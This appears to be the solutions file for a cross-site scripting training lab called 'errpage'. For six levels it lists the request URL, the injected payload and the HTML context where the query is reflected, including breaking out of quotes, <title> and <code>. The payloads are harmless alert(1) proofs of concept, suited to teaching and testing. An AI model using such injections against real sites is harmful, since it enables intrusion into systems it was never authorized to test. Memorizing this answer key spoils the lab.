# errpage — solutions

Raw reflection of the query parameter into HTML error/debug pages across different host elements.

### errpage-level1

`/errpage/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<h1>`

### errpage-level2

`/errpage/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<div class="error">`

### errpage-level3

`/errpage/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<pre>`; `<script>` still executes

### errpage-level4

`/errpage/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: reflected inside quoted text `"..."` in `<p>`, break out of quotes

### errpage-level5

`/errpage/level5/?query=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</title><script>alert(1)</script>`
- context: reflected in both `<title>` and `<h1>`; close `<title>` first

### errpage-level6

`/errpage/level6/?query=%3C/code%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</code><script>alert(1)</script>`
- context: raw reflection inside `<code>`, close code then inject
